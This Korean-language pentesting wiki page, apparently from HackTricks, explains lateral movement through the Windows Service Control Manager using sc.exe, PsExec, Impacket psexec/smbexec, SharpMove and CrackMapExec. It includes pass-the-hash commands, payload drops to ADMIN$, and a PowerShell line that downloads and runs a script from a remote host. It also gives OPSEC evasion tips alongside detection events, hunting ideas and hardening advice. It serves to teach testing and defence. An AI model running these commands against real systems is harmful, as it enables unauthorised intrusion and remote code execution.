# 원격 서비스 실행 (PsExec, WinExec, ScExec, SMBExec, SCMExec)

{{#include ../../banners/hacktricks-training.md}}

## 작동 방식

이 기법은 SMB/RPC를 통해 원격으로 Windows Service Control Manager (SCM)을 악용해 대상 호스트에서 명령을 실행합니다. Service Control Manager Remote Protocol (SCMR)은 원격 컴퓨터의 Windows 서비스를 구성하고 제어하기 위한 RPC 기반 인터페이스입니다. 충분한 권한이 있으면 운영자는 명령이 포함된 바이너리 경로로 서비스를 만들거나 재구성한 다음, 해당 서비스를 시작해 원격으로 명령을 실행할 수 있습니다.<sup>[[5]](#references)</sup> 일반적인 흐름은 다음과 같습니다.

1. SMB/RPC (TCP/445)를 통해 대상에 인증합니다. 선택한 변형에서 파일을 스테이징하거나 출력을 가져와야 하는 경우 ADMIN$ 공유에 액세스합니다.
2. 실행할 실행 파일을 복사하거나 LOLBAS 명령줄을 지정합니다.
3. 해당 명령 또는 바이너리를 가리키는 서비스를 SCM (MS-SCMR over \PIPE\svcctl)을 통해 원격으로 만듭니다.
4. 서비스를 시작해 payload를 실행하고, 선택적으로 named pipe를 통해 stdin/stdout을 캡처합니다.
5. 서비스를 중지하고 정리합니다 (서비스와 드롭한 바이너리를 삭제합니다).

요구 사항/사전 조건:
- 대상의 Local Administrator (SeCreateServicePrivilege) 권한 또는 대상에서 명시적인 서비스 생성 권한이 필요합니다.
- SMB (445)에 연결할 수 있어야 하며, 호스트 방화벽에서 Remote Service Management가 허용되어야 합니다. 파일을 스테이징하거나 출력을 가져오는 변형에서는 ADMIN$를 사용할 수 있어야 합니다.
- UAC Remote Restrictions: 로컬 계정을 사용하는 경우, 기본 제공 Administrator 계정을 사용하거나 LocalAccountTokenFilterPolicy=1로 설정하지 않으면 토큰 필터링으로 인해 네트워크를 통한 관리자 권한이 차단될 수 있습니다.
- Kerberos vs NTLM: 호스트명/FQDN을 사용하면 Kerberos가 활성화되고, IP로 연결하면 NTLM으로 폴백되는 경우가 많습니다 (보안이 강화된 환경에서는 차단될 수 있음).

서비스 계정을 지정하지 않으면 `CreateService`는 광범위한 로컬 권한을 가진 `LocalSystem`을 사용합니다. 따라서 SCM을 통한 실행이 성공하면 영향이 큽니다. 이 방식이 UAC나 Microsoft Defender를 자동으로 비활성화하지는 않습니다. 호출자에게는 여전히 원격 SCM 권한이 필요하며, 엔드포인트 제어 기능은 서비스나 payload를 검사하거나 차단할 수 있습니다.<sup>[[7]](#references)</sup><sup>[[8]](#references)</sup>

### sc.exe를 통한 수동 ScExec/WinExec

다음은 최소한의 서비스 생성 방법을 보여 줍니다. 서비스 이미지는 드롭한 EXE이거나 cmd.exe 또는 powershell.exe와 같은 LOLBAS일 수 있습니다.

```cmd
:: Execute a one-liner without dropping a binary
sc.exe \\TARGET create HTSvc binPath= "cmd.exe /c whoami > C:\\Windows\\Temp\\o.txt" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc

:: Drop a payload to ADMIN$ and execute it (example path)
copy payload.exe \\TARGET\ADMIN$\Temp\payload.exe
sc.exe \\TARGET create HTSvc binPath= "C:\\Windows\\Temp\\payload.exe" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc
```

Notes:
- 서비스가 아닌 EXE를 시작할 때 timeout error가 발생할 수 있습니다. 그래도 실행은 됩니다.
- OPSEC 측면에서 더 안전하게 하려면 fileless commands(cmd /c, powershell -enc)를 우선 사용하거나 드롭한 artifact를 삭제하세요.

자세한 단계는 다음에서 확인하세요: https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/<sup>[[3]](#references)</sup>

## Tooling and examples

### Sysinternals PsExec.exe

- SMB를 사용해 ADMIN$에 PSEXESVC.exe를 드롭하고, 임시 service(기본 이름 PSEXESVC)를 설치한 뒤, named pipes를 통해 I/O를 중계하는 고전적인 admin tool입니다.
- 사용 예시:<sup>[[1]](#references)</sup>

```cmd
:: Interactive SYSTEM shell on remote host
PsExec64.exe -accepteula \\HOST -s -i cmd.exe

:: Run a command as a specific domain user
PsExec64.exe -accepteula \\HOST -u DOMAIN\user -p 'Passw0rd!' cmd.exe /c whoami /all

:: Customize the service name for OPSEC (-r)
PsExec64.exe -accepteula \\HOST -r WinSvc$ -s cmd.exe /c ipconfig
```

- Sysinternals Live에서 WebDAV를 통해 직접 실행할 수 있습니다:

```cmd
\\live.sysinternals.com\tools\PsExec64.exe -accepteula \\HOST -s cmd.exe /c whoami
```

OPSEC
- 서비스 설치/제거 이벤트를 남기며(서비스 이름은 -r을 사용하지 않는 한 보통 PSEXESVC), 실행 중 C:\Windows\PSEXESVC.exe를 생성합니다.

### Impacket psexec.py (PsExec-like)

- RemCom와 유사한 서비스를 내장해 사용합니다. ADMIN$를 통해 일시적인 서비스 바이너리(일반적으로 무작위 이름)를 드롭하고, 서비스를 생성하며(기본값은 보통 RemComSvc), named pipe를 통해 I/O를 프록시합니다.

```bash
# Password auth
psexec.py DOMAIN/user:Password@HOST cmd.exe

# Pass-the-Hash
psexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST cmd.exe

# Kerberos (use tickets in KRB5CCNAME)
psexec.py -k -no-pass -dc-ip 10.0.0.10 DOMAIN/user@host.domain.local cmd.exe

# Change service name and output encoding
psexec.py -service-name HTSvc -codec utf-8 DOMAIN/user:Password@HOST powershell -nop -w hidden -c "iwr http://10.10.10.1/a.ps1|iex"
```

Kali에서 Impacket 예제는 `/usr/share/doc/python3-impacket/examples/`에 있을 수 있습니다. password를 제공하지 않으면 도구에서 password를 입력하라는 메시지가 표시됩니다. Impacket의 `-k` 옵션은 NTLM 대신 Kerberos 인증을 요청하며, 일반적으로 현재 자격 증명 캐시나 제공된 자격 증명을 사용합니다.

```bash
#If no password is provided, it will be prompted
./psexec.py [[domain/]username[:password]@]<targetName or address>
./psexec.py -hashes <LM:NT> administrator@10.10.10.103 #Pass-the-Hash
psexec \\192.168.122.66 -u Administrator -p 123456Ww
psexec \\192.168.122.66 -u Administrator -p '<password>' # Sysinternals PsExec password authentication
```

흔적
- C:\Windows\에 임시 EXE 파일 생성(무작위 8자). 별도로 지정하지 않으면 서비스 이름은 RemComSvc입니다.

### Impacket smbexec.py (SMBExec)

- cmd.exe를 실행하는 임시 서비스를 생성하고 I/O에 named pipe를 사용합니다. 일반적으로 전체 EXE payload를 드롭하지 않으며, 명령 실행은 반대화형 방식입니다.

```bash
smbexec.py DOMAIN/user:Password@HOST
smbexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST
```

### SharpLateral and SharpMove

- [SharpLateral](https://github.com/mertdas/SharpLateral) (C#)는 service-based exec를 포함한 여러 lateral movement 방법을 구현합니다.

```cmd
SharpLateral.exe redexec HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe.exe malware.exe ServiceName
```

- [SharpMove](https://github.com/0xthirteen/SharpMove)는 SCM 및 서비스 수정/생성을 비롯한 여러 Windows 메커니즘을 통한 인증된 원격 실행을 지원합니다.

```cmd
SharpMove.exe action=modsvc computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true servicename=TestService
SharpMove.exe action=startservice computername=remote.host.local servicename=TestService
```

- CrackMapExec을 사용해 다른 백엔드(psexec/smbexec/wmiexec)를 통해 실행할 수도 있습니다:

```bash
cme smb HOST -u USER -p PASS -x "whoami" --exec-method psexec
cme smb HOST -u USER -H NTHASH -x "ipconfig /all" --exec-method smbexec
```

#### SharpMove를 사용한 SCMExec

SCM 작업은 `WindowsDebug`라는 서비스를 생성하고, 원격 호스트에 이미 있는 페이로드를 해당 서비스가 가리키도록 설정합니다.<sup>[[6]](#references)</sup>

```powershell
SharpMove.exe action=scm computername=remote.host.local command="C:\windows\temp\payload.exe" servicename=WindowsDebug amsi=true
```

## OPSEC, 탐지 및 아티팩트

PsExec 유사 기법을 사용할 때 일반적으로 호스트/네트워크에 남는 아티팩트:
- 대상에서 사용된 관리자 계정에 대해 Security 4624 (Logon Type 3) 및 4672 (Special Privileges) 이벤트가 발생합니다.
- Security 5140/5145 File Share 및 File Share Detailed 이벤트에 ADMIN$ 접근과 서비스 바이너리(예: PSEXESVC.exe 또는 무작위 8자 이름의 .exe 파일)의 생성/쓰기가 표시됩니다.
- 대상에 서비스를 설치하면 Service Control Manager에서 **System** 7045 이벤트가 발생합니다. 서비스 이름은 PSEXESVC, RemComSvc 또는 사용자 지정 이름(`-r` / `-service-name`)일 수 있습니다. 이는 서비스가 설치되었다는 증거이지, 해당 이미지가 실행되었다는 증거는 아닙니다. 타임스탬프와 이미지 경로를 프로세스 이벤트 또는 가능한 경우 일치하는 서비스 이미지 prefetch 항목과 대조하세요.<sup>[[4]](#references)</sup>
- Sysmon 1 (Process Create)에서 services.exe 또는 서비스 이미지, 3 (Network Connect), C:\Windows\ 내 11 (File Create), 그리고 \\.\pipe\psexesvc, \\.\pipe\remcom_* 또는 무작위 이름의 동등한 파이프에 대한 17/18 (Pipe Created/Connected) 이벤트가 발생합니다.
- Sysinternals EULA 관련 레지스트리 아티팩트: 운영자 호스트의 HKCU\Software\Sysinternals\PsExec\EulaAccepted=0x1 (억제하지 않은 경우).

헌팅 아이디어
- ImagePath에 cmd.exe /c, powershell.exe 또는 TEMP 경로가 포함된 서비스 설치를 경고 대상으로 설정합니다.
- ParentImage가 C:\Windows\PSEXESVC.exe인 프로세스 생성 또는 services.exe의 자식 프로세스 중 LOCAL SYSTEM으로 실행되며 셸을 실행하는 항목을 찾습니다.
- 이름이 -stdin/-stdout/-stderr로 끝나는 파이프 또는 잘 알려진 PsExec 클론 파이프 이름을 표시합니다.

## 일반적인 문제 해결
- 서비스를 생성할 때 Access is denied (5)가 발생함: 실제 로컬 관리자 권한이 없거나, 로컬 계정에 대한 UAC 원격 제한이 적용되거나, EDR의 서비스 바이너리 경로 변조 방지 기능이 작동했을 수 있습니다.
- 네트워크 경로를 찾을 수 없음 (53) 또는 ADMIN$에 연결할 수 없음: 방화벽이 SMB/RPC를 차단하거나 관리자 공유가 비활성화되었을 수 있습니다.
- Kerberos는 실패하지만 NTLM은 차단됨: IP가 아닌 호스트 이름/FQDN으로 연결하고, 올바른 SPN을 확인하거나, Impacket 사용 시 티켓과 함께 -k/-no-pass를 지정합니다.
- 서비스 시작 시간이 초과되었지만 payload는 실행됨: 실제 서비스 바이너리가 아닌 경우 예상되는 동작입니다. 출력을 파일로 캡처하거나 실시간 I/O가 필요하면 smbexec를 사용합니다.

## 보안 강화 참고 사항
- Windows 11 24H2 및 Windows Server 2025는 기본적으로 아웃바운드 연결(Windows 11은 인바운드 연결도)에 SMB signing을 요구합니다. 유효한 자격 증명을 사용하는 정상적인 PsExec 사용은 중단되지 않지만, 서명되지 않은 SMB relay 악용을 방지하며 signing을 지원하지 않는 장치에는 영향을 줄 수 있습니다.<sup>[[2]](#references)</sup>
- 새로운 SMB client NTLM 차단 기능(Windows 11 24H2/Server 2025)은 IP 또는 Kerberos를 사용하지 않는 서버에 연결할 때 NTLM fallback을 방지할 수 있습니다. 보안 강화 환경에서는 NTLM 기반 PsExec/SMBExec가 작동하지 않습니다. Kerberos(호스트 이름/FQDN)를 사용하거나 정당한 필요가 있는 경우 예외를 설정하세요.<sup>[[2]](#references)</sup>
- 최소 권한 원칙: 로컬 관리자 구성원을 최소화하고, Just-in-Time/Just-Enough Admin을 우선 사용하며, LAPS를 적용하고, 7045 서비스 설치를 모니터링/경고 대상으로 설정합니다.

## 참고 항목

- WMI 기반 원격 실행 (대개 fileless):

{{#ref}}
./wmiexec.md
{{#endref}}

- WinRM 기반 원격 실행:

{{#ref}}
./winrm.md
{{#endref}}

## References

- [1] [PsExec - Sysinternals | Microsoft Learn](https://learn.microsoft.com/sysinternals/downloads/psexec)
- [2] [Windows Server 2025 및 Windows 11의 SMB 보안 강화](https://techcommunity.microsoft.com/blog/filecab/smb-security-hardening-in-windows-server-2025--windows-11/4226591)
- [3] [자격 증명으로 Windows 시스템 장악하기 - 2부 (PSExec 및 서비스)](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
- [4] [Microsoft – 시스템 이벤트 로그를 사용하여 예상치 못한 재부팅 문제 해결](https://learn.microsoft.com/en-us/troubleshoot/windows-server/performance/troubleshoot-unexpected-reboots-system-event-logs)
- [5] [Microsoft Open Specifications - Service Control Manager 원격 프로토콜 개요](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-scmr/d5bd5712-fa64-44bf-9433-3651f6a5ce97)
- [6] [GitHub - SharpMove](https://github.com/0xthirteen/SharpMove)
- [7] [Microsoft Learn - LocalSystem 계정](https://learn.microsoft.com/en-us/windows/win32/services/localsystem-account)
- [8] [Microsoft Learn - `CreateService` 함수](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicea)
{{#include ../../banners/hacktricks-training.md}}
